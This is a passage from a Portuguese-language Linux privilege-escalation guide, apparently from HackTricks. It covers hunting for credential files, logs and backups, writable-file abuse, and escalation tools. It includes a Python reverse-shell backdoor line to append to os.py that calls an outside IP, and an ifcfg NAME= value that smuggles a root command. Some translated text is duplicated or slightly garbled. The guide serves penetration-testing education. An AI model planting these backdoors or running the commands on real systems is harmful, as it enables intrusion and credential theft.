Às vezes, os arquivos que pertencem a outros usuários ou que estão em locais estranhos podem ser usados para obter privilégios elevados. Por exemplo, um arquivo de configuração de serviço pode conter senhas ou chaves de API que podem ser usadas para acessar outros sistemas ou serviços. Se um usuário com privilégios elevados tiver acesso a esses arquivos, ele poderá usá-los para obter acesso não autorizado.

#### Exploração

1. Procure arquivos que pertençam a outros usuários ou que estejam em locais estranhos, como diretórios de backup ou temporários.
2. Verifique se esses arquivos contêm informações confidenciais, como senhas, chaves de API ou tokens de autenticação.
3. Se esses arquivos contiverem informações confidenciais, tente usá-las para obter acesso não autorizado a outros sistemas ou serviços.

#### Prevenção

1. Restrinja o acesso a arquivos confidenciais, limitando o número de usuários que podem acessá-los.
2. Use criptografia para proteger informações confidenciais armazenadas em arquivos.
3. Monitore o acesso a arquivos confidenciais para detectar atividades suspeitas.
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```
### Arquivos modificados nos últimos minutos
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Arquivos de banco de dados Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### Arquivos \*\_history, .sudo\_as\_admin\_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml

Esses arquivos são comumente explorados por atacantes em busca de informações sensíveis ou para obter privilégios elevados. 

- **\*\_history**: contém o histórico de comandos executados pelo usuário. Pode conter senhas ou outras informações sensíveis.

- **.sudo\_as\_admin\_successful**: contém informações sobre as vezes em que o usuário executou com sucesso comandos com privilégios de administrador usando o sudo.

- **profile, bashrc**: arquivos de configuração do shell que podem conter informações sensíveis ou comandos maliciosos.

- **httpd.conf**: arquivo de configuração do servidor web Apache. Pode conter informações sensíveis, como senhas de banco de dados.

- **.plan**: arquivo de texto que pode conter informações sobre o sistema ou sobre o usuário.

- **.htpasswd**: arquivo que armazena senhas criptografadas para autenticação HTTP básica.

- **.git-credentials**: arquivo que armazena credenciais para autenticação em repositórios Git.

- **.rhosts, hosts.equiv**: arquivos usados para autenticação remota em sistemas Unix. Podem ser explorados para obter acesso não autorizado.

- **Dockerfile, docker-compose.yml**: arquivos usados para construir e executar contêineres Docker. Podem conter informações sensíveis, como senhas de banco de dados ou chaves de API.
```bash
fils=`find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null`Hidden files
```
### Arquivos ocultos
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Scripts/Binários no PATH**

Se um usuário tiver permissão para gravar em um diretório no PATH, ele poderá criar um script ou binário com o mesmo nome de um comando com privilégios elevados. Quando o comando for executado, o script ou binário criado pelo usuário será executado em vez do comando original, permitindo que o usuário execute comandos com privilégios elevados.

Para verificar se existem scripts ou binários maliciosos no PATH, execute o seguinte comando:

```bash
echo $PATH | tr ':' '\n' | xargs -I {} find {} -type f -perm -u=s 2>/dev/null
```

Este comando lista todos os arquivos no PATH que têm permissões definidas para o usuário e para o grupo, o que significa que podem ser executados com privilégios elevados. Verifique se há arquivos suspeitos e verifique seu conteúdo para garantir que não sejam maliciosos. Se encontrar um arquivo malicioso, remova-o imediatamente.
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type -f -executable 2>/dev/null; done
```
### **Arquivos da Web**

#### **1. Backup files**

#### **1. Arquivos de backup**

If the web server is not properly configured, it may be possible to access backup files that contain sensitive information such as passwords or database credentials.

Se o servidor web não estiver configurado corretamente, pode ser possível acessar arquivos de backup que contenham informações sensíveis, como senhas ou credenciais de banco de dados.

Some common backup file extensions to look for are `.bak`, `.swp`, `.old`, `.orig`, and `.backup`.

Algumas extensões comuns de arquivos de backup para procurar são `.bak`, `.swp`, `.old`, `.orig` e `.backup`.

#### **2. Configuration files**

#### **2. Arquivos de configuração**

Configuration files can contain sensitive information such as database credentials, API keys, and passwords. These files are often stored in plain text and can be accessed if the web server is not properly configured.

Arquivos de configuração podem conter informações sensíveis, como credenciais de banco de dados, chaves de API e senhas. Esses arquivos são frequentemente armazenados em texto simples e podem ser acessados se o servidor web não estiver configurado corretamente.

Some common configuration file names to look for are `config.php`, `wp-config.php`, `settings.py`, and `database.yml`.

Alguns nomes comuns de arquivos de configuração para procurar são `config.php`, `wp-config.php`, `settings.py` e `database.yml`.

#### **3. Log files**

#### **3. Arquivos de log**

Log files can contain sensitive information such as user credentials and session IDs. These files are often stored in plain text and can be accessed if the web server is not properly configured.

Arquivos de log podem conter informações sensíveis, como credenciais de usuário e IDs de sessão. Esses arquivos são frequentemente armazenados em texto simples e podem ser acessados se o servidor web não estiver configurado corretamente.

Some common log file names to look for are `access.log`, `error.log`, and `debug.log`.

Alguns nomes comuns de arquivos de log para procurar são `access.log`, `error.log` e `debug.log`.
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Backups**

#### Descrição

Os backups são cópias de segurança dos dados importantes que podem ser usados para restaurar informações em caso de perda ou corrupção. Eles são uma parte crucial da segurança de dados e devem ser realizados regularmente.

#### Exploração

Se um backup é armazenado em um local inseguro ou acessível, ele pode ser explorado por um invasor para obter informações confidenciais ou para restaurar um sistema comprometido. É importante garantir que os backups sejam armazenados em um local seguro e que o acesso a eles seja restrito apenas a usuários autorizados.

#### Prevenção

- Armazene backups em um local seguro e inacessível a usuários não autorizados.
- Criptografe backups para proteger informações confidenciais.
- Verifique regularmente a integridade dos backups para garantir que eles possam ser restaurados com sucesso em caso de necessidade.
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/nulll
```
### Arquivos conhecidos que contêm senhas

Leia o código do [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), ele procura por **vários arquivos possíveis que poderiam conter senhas**.\
**Outra ferramenta interessante** que você pode usar para fazer isso é: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) que é um aplicativo de código aberto usado para recuperar muitas senhas armazenadas em um computador local para Windows, Linux e Mac.

### Logs

Se você pode ler logs, pode ser capaz de encontrar **informações interessantes/confidenciais dentro deles**. Quanto mais estranho o log, mais interessante ele será (provavelmente).\
Além disso, alguns logs de auditoria "**ruins**" configurados (com backdoor?) podem permitir que você **registre senhas** dentro dos logs de auditoria, conforme explicado neste post: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Para **ler logs o grupo** [**adm**](interesting-groups-linux-pe/#adm-group) será muito útil.

### Arquivos de shell
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Busca Genérica de Credenciais/Regex

Você também deve verificar arquivos que contenham a palavra "**password**" em seu **nome** ou dentro do **conteúdo**, e também verificar IPs e e-mails dentro de logs, ou expressões regulares de hashes.\
Não vou listar aqui como fazer tudo isso, mas se você estiver interessado, pode verificar as últimas verificações que o [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) realiza.

## Arquivos Graváveis

### Sequestro de Biblioteca Python

Se você sabe de **onde** um script python será executado e você **pode escrever dentro** daquela pasta ou você pode **modificar bibliotecas python**, você pode modificar a biblioteca do sistema operacional e backdoor ela (se você pode escrever onde o script python será executado, copie e cole a biblioteca os.py).

Para **backdoor a biblioteca**, basta adicionar no final da biblioteca os.py a seguinte linha (altere o IP e a PORTA):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Exploração do Logrotate

Existe uma vulnerabilidade no `logrotate` que permite a um usuário com **permissões de escrita sobre um arquivo de log** ou **qualquer um** de seus **diretórios pai**s fazer com que o `logrotate` escreva **um arquivo em qualquer local**. Se o **logrotate** estiver sendo executado pelo **root**, então o usuário poderá escrever qualquer arquivo em _**/etc/bash\_completion.d/**_ que será executado por qualquer usuário que fizer login.\
Portanto, se você tiver **permissões de escrita** sobre um **arquivo de log** **ou** qualquer um de seus **diretórios pai**, você pode **elevar privilégios** (na maioria das distribuições Linux, o logrotate é executado automaticamente uma vez por dia como **usuário root**). Além disso, verifique se, além de _/var/log_, há mais arquivos sendo **rotacionados**.

{% hint style="info" %}
Essa vulnerabilidade afeta a versão `3.18.0` e anteriores do `logrotate`.
{% endhint %}

Informações mais detalhadas sobre a vulnerabilidade podem ser encontradas nesta página: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Você pode explorar essa vulnerabilidade com [**logrotten**](https://github.com/whotwagner/logrotten).

Essa vulnerabilidade é muito semelhante a [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logs do nginx)**, portanto, sempre que você descobrir que pode alterar logs, verifique quem está gerenciando esses logs e verifique se você pode elevar privilégios substituindo os logs por links simbólicos.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

Se, por qualquer motivo, um usuário puder **escrever** um script `ifcf-<qualquer coisa>` em _/etc/sysconfig/network-scripts_ **ou** puder **ajustar** um existente, então seu **sistema está comprometido**.

Os scripts de rede, _ifcg-eth0_, por exemplo, são usados para conexões de rede. Eles se parecem exatamente com arquivos .INI. No entanto, eles são \~sourced\~ no Linux pelo Network Manager (dispatcher.d).

No meu caso, o atributo `NAME=` nesses scripts de rede não é tratado corretamente. Se você tiver **espaço em branco no nome, o sistema tenta executar a parte após o espaço em branco**. Isso significa que **tudo após o primeiro espaço em branco é executado como root**.

Por exemplo: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Note o espaço em branco entre Network e /bin/id_)

**Referência de vulnerabilidade:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

### **init, init.d, systemd e rc.d**

`/etc/init.d` contém **scripts** usados pelas ferramentas de inicialização do System V (SysVinit). Este é o **pacote tradicional de gerenciamento de serviços para Linux**, contendo o programa `init` (o primeiro processo que é executado quando o kernel termina de inicializar¹) bem como alguma infraestrutura para iniciar e parar serviços e configurá-los. Especificamente, os arquivos em `/etc/init.d` são scripts shell que respondem aos comandos `start`, `stop`, `restart` e (quando suportado) `reload` para gerenciar um serviço específico. Esses scripts podem ser invocados diretamente ou (mais comumente) por meio de algum outro gatilho (tipicamente a presença de um link simbólico em `/etc/rc?.d/`). (De [aqui](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)). Outra alternativa para esta pasta é `/etc/rc.d/init.d` no Redhat.

`/etc/init` contém arquivos de **configuração** usados pelo **Upstart**. Upstart é um pacote jovem de gerenciamento de serviços defendido pelo Ubuntu. Os arquivos em `/etc/init` são arquivos de configuração que informam ao Upstart como e quando `start`, `stop`, `reload` a configuração ou consultar o `status` de um serviço. A partir do lucid, o Ubuntu está fazendo a transição do SysVinit para o Upstart, o que explica por que muitos serviços vêm com scripts SysVinit, mesmo que os arquivos de configuração do Upstart sejam preferidos. Os scripts SysVinit são processados por uma camada de compatibilidade no Upstart. (De [aqui](https://askubuntu.com/questions/5039/what-is-the-difference-between-etc-init-and-etc-init-d)).

**systemd** é um **sistema de inicialização e gerenciador de serviços do Linux que inclui recursos como inicialização sob demanda de daemons**, manutenção de pontos de montagem e automontagem, suporte a snapshot e rastreamento de processos usando grupos de controle do Linux. O systemd fornece um daemon de registro e outras ferramentas e utilitários para ajudar nas tarefas comuns de administração do sistema. (De [aqui](https://www.linode.com/docs/quick-answers/linux-essentials/what-is-systemd/)).

Arquivos que são enviados em pacotes baixados do repositório de distribuição vão para `/usr/lib/systemd/`. Modificações feitas pelo administrador do sistema (usuário) vão para `/etc/systemd/system/`.

## Outros truques

### Escalação de privilégios NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Escapando de shells restritos

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Proteções de segurança do kernel

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Mais ajuda

[Binários estáticos do impacket](https://github.com/ropnop/impacket\_static\_binaries)

## Ferramentas de Privesc Linux/Unix

### **Melhor ferramenta para procurar vetores de escalonamento de privilégios locais do Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(opção -t)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerar vulnerabilidades do kernel no Linux e MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local\_exploit\_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (acesso físico):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilação de mais scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Referências

[https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)\
[https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)\
[https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)\
[http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)\
[https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)\
[https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)\
[https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)\
[https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)\
[https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting
